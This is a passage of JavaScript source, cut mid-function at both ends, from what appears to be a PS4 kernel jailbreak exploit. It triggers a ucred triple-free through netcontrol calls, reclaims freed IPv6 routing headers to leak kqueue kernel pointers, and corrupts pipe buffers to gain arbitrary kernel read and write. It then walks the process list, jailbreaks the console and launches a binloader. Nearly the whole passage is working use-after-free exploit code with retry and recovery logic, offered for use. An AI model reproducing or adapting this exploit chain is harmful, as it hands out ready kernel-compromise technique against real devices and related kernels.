      var got = get_rthdr(ipv6_socks[triplets[i]], leak_rthdr, 8);
      if (got < 8) return false;
    } catch (e) {
      return false;
    }
    var tag = read32(tag_add);
    if ((tag & 0xFFFF0000) !== RTHDR_TAG) return false;
    tags[i] = tag;
  }
  return tags[0] === tags[1] && tags[1] === tags[2];
}
function refind_triplets_recovery() {
  if (!triplet_index_ok(triplets[0])) return false;
  for (var recovery = 0; recovery < RW_RECOVERY_TRIES; recovery++) {
    var t1 = find_triplet(triplets[0], -1, FIND_TRIPLET_FAST);
    if (t1 !== -1) {
      var t2 = find_triplet(triplets[0], t1, FIND_TRIPLET_FAST);
      if (t2 !== -1) {
        triplets[1] = t1;
        triplets[2] = t2;
        if (triplets_agree_recovery()) return true;
      }
    }
    sched_yield();
  }
  return false;
}
function read_triplet_fingerprint(index, out) {
  if (!triplet_index_ok(index)) return false;
  try {
    var got = get_rthdr(ipv6_socks[index], leak_rthdr, 8);
    if (got < 8) return false;
  } catch (e) {
    return false;
  }
  var hdr = read32(leak_rthdr);
  var tag = read32(leak_rthdr.add(0x04));
  if ((tag & 0xFFFF0000) !== RTHDR_TAG) return false;
  out[0] = hdr;
  out[1] = tag;
  return true;
}
function triplets_stable_for_free() {
  if (!triplets_usable()) return false;
  var fp = new Array(2);
  var baseHdr = 0, baseTag = 0, haveBase = false;
  for (var sample = 0; sample < KQUEUE_PROOF_SAMPLES; sample++) {
    var sampleHdr = 0, sampleTag = 0;
    for (var i = 0; i < triplets.length; i++) {
      if (!read_triplet_fingerprint(triplets[i], fp)) return false;
      if (i === 0) {
        sampleHdr = fp[0];
        sampleTag = fp[1];
      } else if (fp[0] !== sampleHdr || fp[1] !== sampleTag) {
        return false;
      }
    }
    if (!haveBase) {
      baseHdr = sampleHdr;
      baseTag = sampleTag;
      haveBase = true;
    } else if (sampleHdr !== baseHdr || sampleTag !== baseTag) {
      return false;
    }
    if (sample + 1 < KQUEUE_PROOF_SAMPLES) sched_yield();
  }
  return true;
}
function prepare_kqueue_triplet_for_free() {
  if (triplets_stable_for_free()) return 'stable';
  if (refind_triplets_recovery() && triplets_stable_for_free()) {
    return 'refind-stable';
  }
  uncontained = 'kqueue-triplet-proof';
  rebootRequired = true;
  log('Alias proof recovery failed; restart required');
  return false;
}
function init_threading() {
  var jmpbuf = malloc(0x60);
  setjmp(jmpbuf);
  saved_fpu_ctrl = Number(read32(jmpbuf.add(0x40)));
  saved_mxcsr = Number(read32(jmpbuf.add(0x44)));
}
var LOG_MAX_LINES = 38;
var LOG_COLORS = ['#FF6B6B', '#FFA94D', '#FFD93D', '#6BCF7F', '#4DABF7', '#9775FA', '#DA77F2'];
function setup_log_screen() {
  jsmaf.root.children.length = 0;
  var bg = new Image({
    url: 'file:///../download0/img/multiview_bg_VAF.png',
    x: 0,
    y: 0,
    width: 1920,
    height: 1080
  });
  jsmaf.root.children.push(bg);
  for (var i = 0; i < LOG_COLORS.length; i++) {
    new Style({
      name: 'log' + i,
      color: LOG_COLORS[i],
      size: 20
    });
  }
  var logLines = [];
  var logBuf = [];
  for (var _i10 = 0; _i10 < LOG_MAX_LINES; _i10++) {
    var line = new jsmaf.Text();
    line.text = '';
    line.style = 'log' + _i10 % LOG_COLORS.length;
    line.x = 20;
    line.y = 120 + _i10 * 20;
    jsmaf.root.children.push(line);
    logLines.push(line);
  }
  _log = function (msg, screen) {
    if (screen) {
      logBuf.push(msg);
      if (logBuf.length > LOG_MAX_LINES) logBuf.shift();
      for (var _i11 = 0; _i11 < LOG_MAX_LINES; _i11++) {
        logLines[_i11].text = _i11 < logBuf.length ? logBuf[_i11] : '';
      }
    }
    ws.broadcast(msg);
  };
}
function yield_to_render(callback) {
  var id = jsmaf.setInterval(function () {
    jsmaf.clearInterval(id);
    try {
      callback();
    } catch (e) {
      log('ERROR: ' + e.message);
      if (can_outer_retry()) {
        start_outer_retry();
      } else if (committed || rebootRequired) stop_for_reboot(uncontained || 'kernel-stage-error');
      else cleanup();
    }
  }, 0);
}
var exploit_count = 0;
var exploit_end = false;
var outer_retry = 0;
var retryableFailure = '';
function can_outer_retry() {
  return ((retryableFailure === 'triplefree-exhausted' && !uncontained) || retryableFailure === 'rw-clean') && !rwValidated && outer_retry < JB_RETRIES;
}
function cleanup_for_retry() {
  cleanup(true, true);
  burned.clear();
  cleanup_called = false;
  committed = false;
  rebootRequired = false;
  uncontained = '';
  rwValidated = false;
  retryableFailure = '';
  twins = new Array(2); triplets = new Array(3);
}
function start_outer_retry() {
  outer_retry++;
  log('Fresh NetCtrl retry (' + outer_retry + '/' + JB_RETRIES + ') in 2s...');
  cleanup_for_retry();
  jsmaf.setTimeout(function () { exploit_phase_setup(); }, JB_RETRY_DELAY_MS);
}
function netctrl_exploit() {
  if (rebootRequired || committed) {
    setup_log_screen();
    log('Kernel state requires a restart.');
    log('Restart the PS4 and try again.');
    return;
  }
  outer_retry = 0;
  retryableFailure = '';
  setup_log_screen();
  var supported_fw = init();
  if (!supported_fw) {
    return;
  }
  log('Preparing exploit...');
  yield_to_render(exploit_phase_setup);
}
function exploit_phase_setup() {
  setup();
  log('Workers spawned');
  exploit_count = 0;
  exploit_end = false;
  rwValidated = false;
  retryableFailure = '';
  yield_to_render(exploit_phase_trigger);
}
function exploit_phase_trigger() {
  if (uncontained) {
    stop_for_reboot(uncontained);
    return;
  }
  if (exploit_count >= MAIN_LOOP_ITERATIONS) {
    log('Failed to acquire kernel R/W');
    if (can_outer_retry()) start_outer_retry();
    else if (committed || rebootRequired) stop_for_reboot('attempts-exhausted');
    else cleanup();
    return;
  }
  retryableFailure = '';
  exploit_count++;
  log('Triggering vulnerability (' + exploit_count + '/' + MAIN_LOOP_ITERATIONS + ')...');
  if (!trigger_ucred_triplefree()) {
    if (exploit_count >= MAIN_LOOP_ITERATIONS && can_outer_retry()) {
      start_outer_retry();
      return;
    }
    yield_to_render(exploit_phase_trigger);
    return;
  }
  var kqTripletProof = prepare_kqueue_triplet_for_free();
  if (!kqTripletProof) {
    stop_for_reboot(uncontained || 'kqueue-triplet-proof');
    return;
  }
  log('Leaking kqueue...');
  yield_to_render(exploit_phase_leak);
}
function exploit_phase_leak() {
  if (!leak_kqueue()) {
    stop_for_reboot(uncontained || 'kqueue-leak');
    return;
  }
  log('Setting up arbitrary R/W...');
  yield_to_render(exploit_phase_rw);
}
function exploit_phase_rw() {
  setup_arbitrary_rw();
  log('Jailbreaking...');
  yield_to_render(exploit_phase_jailbreak);
}
function exploit_phase_jailbreak() {
  if (!rwValidated) {
    stop_for_reboot('kernel-rw-not-validated');
    return;
  }
  jailbreak();
}
function setup_arbitrary_rw() {
  rwValidated = false;
  var fd_files = require_kernel_ptr(kreadslow64(kq_fdp), 'fd-files');
  fdt_ofiles = fd_files.add(0x00);
  debug('fdt_ofiles: ' + hex(fdt_ofiles));
  master_r_pipe_file = require_kernel_ptr(kreadslow64(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE)), 'master-pipe-file');
  debug('master_r_pipe_file: ' + hex(master_r_pipe_file));
  victim_r_pipe_file = require_kernel_ptr(kreadslow64(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE)), 'victim-pipe-file');
  debug('victim_r_pipe_file: ' + hex(victim_r_pipe_file));
  master_r_pipe_data = require_kernel_ptr(kreadslow64(master_r_pipe_file.add(0x00)), 'master-pipe-data');
  debug('master_r_pipe_data: ' + hex(master_r_pipe_data));
  victim_r_pipe_data = require_kernel_ptr(kreadslow64(victim_r_pipe_file.add(0x00)), 'victim-pipe-data');
  debug('victim_r_pipe_data: ' + hex(victim_r_pipe_data));
  write32(master_pipe_buf.add(0x00), 0); // cnt
  write32(master_pipe_buf.add(0x04), 0); // in
  write32(master_pipe_buf.add(0x08), 0); // out
  write32(master_pipe_buf.add(0x0C), PAGE_SIZE); // size
  write64(master_pipe_buf.add(0x10), victim_r_pipe_data); // buffer
  var ret_write = kwriteslow_retry(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE);
  if (ret_write.eq(BigInt_Error)) {
    mark_reboot_required('kernel-rw-setup');
    throw new Error('Kernel R/W verification failed');
  }
  var kws_success = 0;
  for (var i = 0; i < 3; i++) {
    rwDiagStage = 'pipe-proof';
    if (kread64(master_r_pipe_data.add(0x10)).eq(victim_r_pipe_data)) {
      kws_success = 1;
      break;
    }
    debug('kwriteslow did not work - Trying again');
    ret_write = kwriteslow_retry(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE);
    if (ret_write.eq(BigInt_Error)) {
      mark_reboot_required('kernel-rw-setup');
      throw new Error('Kernel R/W verification failed');
    }
  }
  if (kws_success === 0) {
    mark_reboot_required('kernel-rw-proof');
    throw new Error('Kernel R/W verification failed');
  }
  fhold(fget(master_pipe[0]));
  fhold(fget(master_pipe[1]));
  fhold(fget(victim_pipe[0]));
  fhold(fget(victim_pipe[1]));
  if (!remove_rthr_from_socket(ipv6_socks[triplets[0]]) ||
      !remove_rthr_from_socket(ipv6_socks[triplets[1]]) ||
      !remove_rthr_from_socket(ipv6_socks[triplets[2]])) {
    mark_reboot_required('triplet-repair');
    throw new Error('Kernel alias repair failed');
  }
  if (!repair_burned_sockets()) {
    throw new Error('Burned socket repair failed');
  }
  remove_uaf_file();
  for (var _i12 = 0; _i12 < 0x20; _i12 = _i12 + 8) {
    var readed = kread64(master_r_pipe_data.add(_i12));
    debug('Reading master_r_pipe_data[' + _i12 + '] : ' + hex(readed));
  }
  rwValidated = true;
  log('Kernel R/W verified');
  debug('Reading value in victim_r_pipe_file: ' + hex(kread64(victim_r_pipe_file)));
}
function find_allproc() {
  var pipe_0 = master_pipe[0];
  var pipe_1 = master_pipe[1];
  debug('find_allproc - Using master_pipe fds: ' + pipe_0 + ', ' + pipe_1);
  debug('find_allproc - Getting pid...');
  var pid = Number(getpid());
  debug('find_allproc - pid: ' + pid);
  debug('find_allproc - Writing pid to sockopt_val_buf...');
  write32(sockopt_val_buf, pid);
  debug('find_allproc - Calling ioctl FIOSETOWN...');
  var ioctl_ret = ioctl(new BigInt(pipe_0), FIOSETOWN, sockopt_val_buf);
  debug('find_allproc - ioctl returned: ' + ioctl_ret);
  debug('find_allproc - Getting fp...');
  var fp = require_kernel_ptr(fget(pipe_0), 'allproc-fp');
  debug('find_allproc - fp: ' + hex(fp));
  debug('find_allproc - Reading f_data...');
  var f_data = require_kernel_ptr(kread64(fp.add(0x00)), 'allproc-fdata');
  debug('find_allproc - f_data: ' + hex(f_data));
  debug('find_allproc - Reading pipe_sigio...');
  var pipe_sigio = require_kernel_ptr(kread64(f_data.add(0xd0)), 'allproc-sigio');
  debug('find_allproc - pipe_sigio: ' + hex(pipe_sigio));
  debug('find_allproc - Reading p...');
  var p = require_kernel_ptr(kread64(pipe_sigio), 'curproc');
  debug('find_allproc - initial p: ' + hex(p));
  kernel.addr.curproc = p; // Set global curproc
  debug('find_allproc - Walking process list...');
  var walk_count = 0;
  while (!p.and(new BigInt(0xFFFFFFFF, 0x00000000)).eq(new BigInt(0xFFFFFFFF, 0x00000000)) && walk_count < MAX_PROC_WALK) {
    p = require_kernel_ptr(kread64(p.add(0x08)), 'proc-list'); // p_list.le_prev
    walk_count++;
    if (walk_count % 100 === 0) {
      debug('find_allproc - walk_count: ' + walk_count + ' p: ' + hex(p));
    }
  }
  if (walk_count >= MAX_PROC_WALK) {
    mark_reboot_required('proc-walk');
    throw new Error('Process walk validation failed');
  }
  debug('find_allproc - Found allproc after ' + walk_count + ' iterations');
  return p;
}
function jailbreak() {
  debug('jailbreak - Starting...');
  if (!kernel_offset) {
    throw new Error('Kernel offsets not loaded');
  }
  if (FW_VERSION === null) {
    throw new Error('FW_VERSION is null');
  }
  for (var i = 0; i < 10; i++) {
    sched_yield();
  }
  debug('jailbreak - Calling find_allproc...');
  kernel.addr.allproc = find_allproc(); // Set global allproc
  debug('allproc: ' + hex(kernel.addr.allproc));
  kernel.addr.base = kl_lock.sub(kernel_offset.KL_LOCK);
  log('Kernel base: ' + hex(kernel.addr.base));
  jailbreak_shared(FW_VERSION);
  log('Jailbreak complete');
  utils.notify('XxXJokerXxX wishes you a good time!');
  cleanup(false); // Close sockets and kill workers on success
  show_success();
  run_binloader();
}
function fhold(fp) {
  kwrite32(fp.add(0x28), kread32(fp.add(0x28)) + 1); // f_count
}
function fget(fd) {
  var f = kread64(fdt_ofiles.add(fd * FILEDESCENT_SIZE));
  debug('Returning fget: ' + hex(f) + ' for fd: ' + fd);
  return f;
}
function repair_rthdr_socket(fd) {
  if (!(fd > 0)) return false;
  var fp = fget(fd);
  if (!kernel_ptr_ok(fp)) return false;
  var f_data = kread64(fp.add(0x00));
  if (!kernel_ptr_ok(f_data)) return false;
  var so_pcb = kread64(f_data.add(0x18));
  if (!kernel_ptr_ok(so_pcb)) return false;
  var in6p_outputopts = kread64(so_pcb.add(0x118));
  if (!kernel_ptr_ok(in6p_outputopts)) return false;
  kwrite64(in6p_outputopts.add(0x68), new BigInt(0));
  var now = kread64(in6p_outputopts.add(0x68));
  return now.eq(new BigInt(0));
}
function remove_rthr_from_socket(fd) {
  return repair_rthdr_socket(fd);
}
function repair_burned_sockets() {
  var failed = 0;
  for (var index of Array.from(burned)) {
    if (index < 0 || index >= ipv6_socks.length ||
        !repair_rthdr_socket(ipv6_socks[index])) {
      failed++;
      continue;
    }
    burned.delete(index);
  }
  if (failed !== 0 || burned.size !== 0) {
    mark_reboot_required('burned-repair');
    return false;
  }
  return true;
}
var victim_pipe_buf = malloc(PIPEBUF_SIZE);
function corrupt_pipe_buf(cnt, _in, out, size, buffer) {
  if (buffer.eq(0)) {
    throw new Error('buffer cannot be zero');
  }
  write32(victim_pipe_buf.add(0x00), cnt); // cnt
  write32(victim_pipe_buf.add(0x04), _in); // in
  write32(victim_pipe_buf.add(0x08), out); // out
  write32(victim_pipe_buf.add(0x0C), size); // size
  write64(victim_pipe_buf.add(0x10), buffer); // buffer
  write(new BigInt(masterWpipeFd), victim_pipe_buf, PIPEBUF_SIZE);
  /*
    read(masterRpipeFd, debug_buffer, PIPEBUF_SIZE);
    for (const i=0; i<PIPEBUF_SIZE; i=i+8) {
        const readed = read64(victim_pipe_buf.add(i));
        debug("corrupt_read: " + hex(readed) );
    }
        */
  return read(new BigInt(masterRpipeFd), victim_pipe_buf, PIPEBUF_SIZE);
}
function kwrite(dest, src, n) {
  corrupt_pipe_buf(0, 0, 0, PAGE_SIZE, dest);
  return write(new BigInt(victimWpipeFd), src, n);
}
function kread(dest, src, n) {
  debug('Enter kread for src: ' + hex(src));
  corrupt_pipe_buf(n, 0, 0, PAGE_SIZE, src);
  read(new BigInt(victimRpipeFd), dest, n);
}
function kwrite64(addr, val) {
  write64(tmp, val);
  kwrite(addr, tmp, 8);
}
function kwrite32(addr, val) {
  write32(tmp, val);
  kwrite(addr, tmp, 4);
}
function kread64(addr) {
  kread(tmp, addr, 8);
  return read64(tmp);
}
function kread32(addr) {
  kread(tmp, addr, 4);
  return read32(tmp);
}
function read_buffer(addr, len) {
  var buffer = new Uint8Array(len);
  for (var i = 0; i < len; i++) {
    buffer[i] = Number(read8(addr.add(i)));
  }
  return buffer;
}
function write_buffer(addr, buffer) {
  for (var i = 0; i < buffer.length; i++) {
    write8(addr.add(i), buffer[i]);
  }
}
kernel.read_buffer = function (kaddr, len) {
  kread(tmp, kaddr, len);
  return read_buffer(tmp, len);
};
kernel.write_buffer = function (kaddr, buf) {
  write_buffer(tmp, buf);
  kwrite(kaddr, tmp, buf.length);
};
function remove_uaf_file() {
  if (uaf_socket === undefined) {
    throw new Error('uaf_socket is undefined');
  }
  var uafFile = fget(uaf_socket);
  kwrite64(fdt_ofiles.add(uaf_socket * FILEDESCENT_SIZE), new BigInt(0));
  var removed = 0;
  for (var i = 0; i < 0x1000; i++) {
    var s = Number(socket(AF_UNIX, SOCK_STREAM, 0));
    if (fget(s).eq(uafFile)) {
      kwrite64(fdt_ofiles.add(s * FILEDESCENT_SIZE), new BigInt(0));
      removed++;
    }
    close(new BigInt(s));
    if (removed === 3) {
      break;
    }
  }
}
function trigger_ucred_triplefree() {
  var end = false;
  write64(msgIov.add(0x0), 1); // iov_base
  write64(msgIov.add(0x8), 1); // iov_len
  var main_count = 0; // Let's do up to 8 iterations
  while (!end && main_count < TRIPLEFREE_ITERATIONS) {
    main_count++;
    var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
    write32(nc_set_buf, Number(dummy_socket.and(0xFFFFFFFF)));
    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
    close(new BigInt(dummy_socket));
    setuid(1);
    uaf_socket = Number(socket(AF_UNIX, SOCK_STREAM, 0));
    setuid(1);
    write32(nc_clear_buf, uaf_socket);
    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);
    committed = true;
    for (var i = 0; i < 32; i++) {
      trigger_iov_recvmsg();
      sched_yield();
      write(new BigInt(iov_sock_1), tmp, 1);
      wait_iov_recvmsg();
      read(new BigInt(iov_sock_0), tmp, 1);
    }
    close(dup(new BigInt(uaf_socket)));
    rebootRequired = true;
    end = find_twins();
    if (!end) {
      if (uncontained) return false;
      if (cleanup_called) {
        throw new Error('Exploit failed - restart required');
      }
      close(new BigInt(uaf_socket));
      continue;
    }
    log('Triple freeing...');
    free_rthdr(ipv6_socks[twins[1]]);
    var count = 0;
    while (count < 10000) {
      trigger_iov_recvmsg();
      sched_yield();
      get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8);
      if (read32(leak_rthdr) === 1) {
        break;
      }
      write(new BigInt(iov_sock_1), tmp, 1);
      wait_iov_recvmsg();
      read(new BigInt(iov_sock_0), tmp, 1);
      count++;
    }
    if (count === 10000) {
      log('Refcount drive missed; retrying safely');
      burn_socket(twins[0], 'refcount-drive');
      burn_socket(twins[1], 'refcount-drive');
      close(new BigInt(uaf_socket));
      end = false;
      continue;
    }
    triplets[0] = twins[0];
    close(dup(new BigInt(uaf_socket)));
    triplets[1] = find_triplet(triplets[0], -1);
    if (triplets[1] === -1) {
      log('Alias recovery failed; restart required');
      burn_socket(triplets[0], 'triplet-miss');
      burn_socket(twins[1], 'triplet-miss');
      uncontained = 'triplet-miss';
      rebootRequired = true;
      write(new BigInt(iov_sock_1), tmp, 1);
      wait_iov_recvmsg();
      read(new BigInt(iov_sock_0), tmp, 1);
      close(new BigInt(uaf_socket));
      return false;
    }
    write(new BigInt(iov_sock_1), tmp, 1);
    triplets[2] = find_triplet(triplets[0], triplets[1]);
    if (triplets[2] === -1) {
      log('Alias recovery failed; restart required');
      burn_socket(triplets[0], 'triplet-miss');
      burn_socket(triplets[1], 'triplet-miss');
      burn_socket(twins[1], 'triplet-miss');
      uncontained = 'triplet-miss';
      rebootRequired = true;
      wait_iov_recvmsg();
      read(new BigInt(iov_sock_0), tmp, 1);
      close(new BigInt(uaf_socket));
      return false;
    }
    wait_iov_recvmsg();
    read(new BigInt(iov_sock_0), tmp, 1);
  }
  if (main_count === TRIPLEFREE_ITERATIONS) {
    if (!uncontained) retryableFailure = 'triplefree-exhausted';
    log('Failed to Triple Free');
    return false;
  }
  return true;
}
function leak_kqueue() {
  debug('Leaking kqueue...');
  var kqFreeStart = Date.now();
  free_rthdr(ipv6_socks[triplets[1]]);
  var kq = new BigInt(0);
  var held = [];
  var magic_val = new BigInt(0x0, 0x1430000);
  var magic_add = leak_rthdr.add(0x08);
  var count = 0, kqStart = Date.now();
  while (count < KQUEUE_ITERATIONS) {
    kq = kqueue();
    if (kq.eq(BigInt_Error)) {
      while (held.length) close(held.pop());
      sched_yield();
      count++;
      continue;
    }
    held.push(kq);
    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);
    if (read64(magic_add).eq(magic_val) && !read64(leak_rthdr.add(0x98)).eq(0)) {
      kq = held.pop();
      break;
    }
    if (held.length >= KQUEUE_BATCH) {
      while (held.length) close(held.pop());
      sched_yield();
    }
    count++;
  }
  while (held.length) close(held.pop());
  if (count === KQUEUE_ITERATIONS) {
    uncontained = 'kqueue-exhausted';
    rebootRequired = true;
    log('Kernel leak attempt exhausted');
    return false;
  }
  kl_lock = read64(leak_rthdr.add(0x60));
  kq_fdp = read64(leak_rthdr.add(0x98));
  if (!kernel_ptr_ok(kl_lock) || !kernel_ptr_ok(kq_fdp)) {
    log('Kernel pointer validation failed');
    close(kq);
    uncontained = 'kqueue-pointer';
    rebootRequired = true;
    return false;
  }
  debug('kq_fdp: ' + hex(kq_fdp) + ' kl_lock: ' + hex(kl_lock));
  close(kq);
  triplets[1] = -1;
  for (var retry = 0; retry < 3; retry++) {
    triplets[1] = find_triplet(triplets[0], triplets[2], FIND_TRIPLET_FAST);
    if (triplets[1] !== -1) break;
    sched_yield();
  }
  if (triplets[1] === -1) {
    uncontained = 'kqueue-refind';
    rebootRequired = true;
    log('Alias recovery failed; restart required');
    return false;
  }
  return true;
}
function kreadslow64(address) {
  for (var attempt = 0; attempt < SLOW_RW_TRIES; attempt++) {
    lastReadNoLeak = false;
    if (!triplets_usable() && !refind_triplets_fast()) break;
    var buffer = kreadslow(address, 8);
    if (!buffer.eq(BigInt_Error)) return read64(buffer);
    if (rebootRequired && !lastReadNoLeak) break;
    if (!refind_triplets_fast()) { lastReadNoLeak = false; break; }
    sched_yield();
  }
  if (!rebootRequired || lastReadNoLeak) {
    log('R/W recovery: read');
    if (refind_triplets_recovery()) {
      lastReadNoLeak = false;
      var recovery_buffer = kreadslow(address, 8);
      if (!recovery_buffer.eq(BigInt_Error)) {
        log('R/W recovery succeeded');
        return read64(recovery_buffer);
      }
    }
    log('R/W recovery exhausted');
  }
  if (lastReadNoLeak && !uncontained) {
    retryableFailure = 'rw-clean';
    throw new Error('Kernel R/W verification failed');
  }
  mark_reboot_required('kernel-read-proof');
  throw new Error('Kernel R/W verification failed');
}
function kwriteslow_retry(addr, buffer, size) {
  for (var attempt = 0; attempt < SLOW_RW_TRIES; attempt++) {
    if (!triplets_usable() && !refind_triplets_fast()) return BigInt_Error;
    var ret = kwriteslow(addr, buffer, size);
    if (!ret.eq(BigInt_Error)) return ret;
    if (rebootRequired) return BigInt_Error;
    if (!refind_triplets_fast()) return BigInt_Error;
    sched_yield();
  }
  if (!rebootRequired) {
    log('R/W recovery: write');
    if (refind_triplets_recovery()) {
      var recovery_ret = kwriteslow(addr, buffer, size);
      if (!recovery_ret.eq(BigInt_Error)) {
        log('R/W recovery succeeded');
        return recovery_ret;
      }
    }
    log('R/W recovery exhausted');
  }
  return BigInt_Error;
}
function build_uio(uio, uio_iov, uio_td, read, addr, size) {
  write64(uio.add(0x00), uio_iov); // uio_iov
  write64(uio.add(0x08), UIO_IOV_NUM); // uio_iovcnt
  write64(uio.add(0x10), BigInt_Error); // uio_offset
  write64(uio.add(0x18), size); // uio_resid
  write32(uio.add(0x20), UIO_SYSSPACE); // uio_segflg
  write32(uio.add(0x24), read ? UIO_WRITE : UIO_READ); // uio_segflg
  write64(uio.add(0x28), uio_td); // uio_td
  write64(uio.add(0x30), addr); // iov_base
  write64(uio.add(0x38), size); // iov_len
}
function kreadslow(addr, size) {
  debug('Enter kreadslow addr: ' + hex(addr) + ' size : ' + size);
  lastReadNoLeak = false;
  if (debugging.info.memory.available === 0) {
    log('kreadslow - Memory exhausted before start');
    mark_reboot_required('kernel-read-memory');
    return BigInt_Error;
  }
  debug('kreadslow - Preparing buffers...');
  var leak_buffers = new Array(UIO_THREAD_NUM);
  for (var i = 0; i < UIO_THREAD_NUM; i++) {
    leak_buffers[i] = malloc(size);
    fill_buffer_64(leak_buffers[i], new BigInt(0x41414141, 0x41414141), size);
  }
  write32(sockopt_val_buf, size);
  setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);
  write(new BigInt(uio_sock_1), tmp, size);
  write64(uioIovRead.add(0x08), size);
  debug('kreadslow - Freeing triplets[1]=' + triplets[1]);
  free_rthdr(ipv6_socks[triplets[1]]);
  var uio_leak_add = leak_rthdr.add(0x08);
  debug('kreadslow - Starting uio reclaim loop...');
  var count = 0;
  var zeroMemoryCount = 0;
  while (count < 10000) {
    if (debugging.info.memory.available === 0) {
      zeroMemoryCount++;
      if (zeroMemoryCount >= 5) {
        log('Exploit failed');
        mark_reboot_required('kernel-read-memory');
        return BigInt_Error;
      }
    } else {
      zeroMemoryCount = 0;
    }
    count++;
    if (count % 100 === 1) {
      debug('kreadslow - uio loop iter ' + count);
    }
    trigger_uio_writev(); // COMMAND_UIO_READ in fl0w's
    sched_yield();
    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
    if (read32(uio_leak_add) === UIO_IOV_NUM) {
      break;
    }
    read(new BigInt(uio_sock_0), tmp, size);
    for (var _i13 = 0; _i13 < UIO_THREAD_NUM; _i13++) {
      read(new BigInt(uio_sock_0), leak_buffers[_i13], size);
    }
    wait_uio_writev();
    write(new BigInt(uio_sock_1), tmp, size);
  }
  if (count === 10000) {
    debug('kreadslow - Failed uio reclaim after 10000 iterations');
    return BigInt_Error;
  }
  debug('kreadslow - uio reclaim succeeded after ' + count + ' iterations');
  var uio_iov = read64(leak_rthdr);
  debug('kreadslow - uio_iov: ' + hex(uio_iov));
  build_uio(msgIov, uio_iov, 0, true, addr, size);
  debug('kreadslow - Freeing triplets[2]=' + triplets[2]);
  free_rthdr(ipv6_socks[triplets[2]]);
  var iov_leak_add = leak_rthdr.add(0x20);
  debug('kreadslow - Starting iov reclaim loop...');
  var zeroMemoryCount2 = 0;
  var count2 = 0;
  while (count2 < 10000) {
    count2++;
    if (debugging.info.memory.available === 0) {
      zeroMemoryCount2++;
      if (zeroMemoryCount2 >= 5) {
        log('Exploit failed');
        mark_reboot_required('kernel-read-memory');
        return BigInt_Error;
      }
    } else {
      zeroMemoryCount2 = 0;
    }
    trigger_iov_recvmsg();
    sched_yield();
    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
    if (read32(iov_leak_add) === UIO_SYSSPACE) {
      debug('kreadslow - iov reclaim succeeded after ' + count2 + ' iterations');
      break;
    }
    write(new BigInt(iov_sock_1), tmp, 1);
    wait_iov_recvmsg();
    read(new BigInt(iov_sock_0), tmp, 1);
  }
  if (count2 === 10000) {
    debug('kreadslow - iov reclaim exhausted');
    read(new BigInt(uio_sock_0), tmp, size);
    for (var _kr = 0; _kr < UIO_THREAD_NUM; _kr++) {
      read(new BigInt(uio_sock_0), leak_buffers[_kr], size);
    }
    wait_uio_writev();
    return BigInt_Error;
  }
  debug('kreadslow - Reading leak buffers...');
  read(new BigInt(uio_sock_0), tmp, size);
  var leak_buffer = new BigInt(0);
  var tag_val = new BigInt(0x41414141, 0x41414141);
  for (var _i14 = 0; _i14 < UIO_THREAD_NUM; _i14++) {
    read(new BigInt(uio_sock_0), leak_buffers[_i14], size);
    var val = read64(leak_buffers[_i14]);
    debug('kreadslow - leak_buffers[' + _i14 + ']: ' + hex(val));
    if (leak_buffer.eq(0) && !val.eq(tag_val)) {
      leak_buffer = leak_buffers[_i14].add(0);
    }
  }
  wait_uio_writev();
  write(new BigInt(iov_sock_1), tmp, 1);
  wait_iov_recvmsg();
  read(new BigInt(iov_sock_0), tmp, 1);
  if (leak_buffer.eq(0)) {
    lastReadNoLeak = true;
    debug('kreadslow - No valid leak found');
    refind_triplets_fast();
    return BigInt_Error;
  }
  if (!refind_triplets_fast()) {
    debug('kreadslow - Alias refind failed');
    return BigInt_Error;
  }
  debug('kreadslow - Done, returning leak_buffer: ' + hex(leak_buffer));
  return leak_buffer;
}
function kwriteslow(addr, buffer, size) {
  debug('Enter kwriteslow addr: ' + hex(addr) + ' buffer: ' + hex(buffer) + ' size : ' + size);
  write32(sockopt_val_buf, size);
  setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);
  write64(uioIovWrite.add(0x08), size);
  free_rthdr(ipv6_socks[triplets[1]]);
  var uio_leak_add = leak_rthdr.add(0x08);
  var zeroMemoryCount = 0;
  var uio_count = 0;
  while (uio_count < 10000) {
    uio_count++;
    if (debugging.info.memory.available === 0) {
      zeroMemoryCount++;
      if (zeroMemoryCount >= 5) {
        log('Exploit failed');
        mark_reboot_required('kernel-write-memory');
        return BigInt_Error;
      }
    } else {
      zeroMemoryCount = 0;
    }
    trigger_uio_readv(); // COMMAND_UIO_WRITE in fl0w's
    sched_yield();
    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
    if (read32(uio_leak_add) === UIO_IOV_NUM) {
      break;
    }
    for (var i = 0; i < UIO_THREAD_NUM; i++) {
      write(new BigInt(uio_sock_1), buffer, size);
    }
    wait_uio_readv();
  }
  if (uio_count === 10000 && read32(uio_leak_add) !== UIO_IOV_NUM) {
    debug('kwriteslow - uio reclaim exhausted');
    return BigInt_Error;
  }
  var uio_iov = read64(leak_rthdr);
  build_uio(msgIov, uio_iov, 0, false, addr, size);
  free_rthdr(ipv6_socks[triplets[2]]);
  var iov_leak_add = leak_rthdr.add(0x20);
  var zeroMemoryCount2 = 0;
  var iov_count = 0;
  while (iov_count < 10000) {
    iov_count++;
    if (debugging.info.memory.available === 0) {
      zeroMemoryCount2++;
      if (zeroMemoryCount2 >= 5) {
        log('Exploit failed');
        mark_reboot_required('kernel-write-memory');
        return BigInt_Error;
      }
    } else {
      zeroMemoryCount2 = 0;
    }
    trigger_iov_recvmsg();
    sched_yield();
    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
    if (read32(iov_leak_add) === UIO_SYSSPACE) {
      break;
    }
    write(new BigInt(iov_sock_1), tmp, 1);
    wait_iov_recvmsg();
